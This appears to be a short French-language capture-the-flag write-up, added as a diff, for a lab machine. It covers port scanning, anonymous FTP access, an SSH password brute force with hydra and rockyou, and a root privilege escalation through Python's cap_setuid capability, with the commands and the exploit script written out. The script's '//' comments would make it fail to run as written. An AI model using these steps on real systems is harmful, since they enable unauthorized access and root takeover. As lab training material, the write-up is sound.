@@ -1,0 +1,38 @@
+Nmap -Sv -v <IP>
+
+Port ouverts : 21/22/80
+
+Web -> rien ( pas d'upload rien pas d'url gobuster)
+
+ftp -> connection en anonymous 
+
+Login : anonymous 
+password: 
+
+2 login 
+rcampbell
+gcrawford
+
+SSH ou FTP credentials ? 
+
+bruteforce avec hydra : 
+hydra ssh://<IP> -l rcampbell -P /usr/share/wordlists/rockyou.txt -t 64
+
+found password : 
+Login : rcampell
+Password : ireland
+
+gepcap -r / 2>/dev/null
+
+Les capabilities(qui nécéssite root mais qui peuvent être lancée sans root) de Python3 
+on voit qu'on a le cap_setuid+ep ( c'est a dire qu'on peut utilisé la fonction setuid de python sans root)
+
+on fait un ptit script
+
+import os,pty
+
+os.setuid(0) // donne le setuid 0 = root
+pty.spawn("/bin/bash") // lance un bash en tant que root ! :)
+
+Et c'est gagné ggwp on est root sur la machine
+
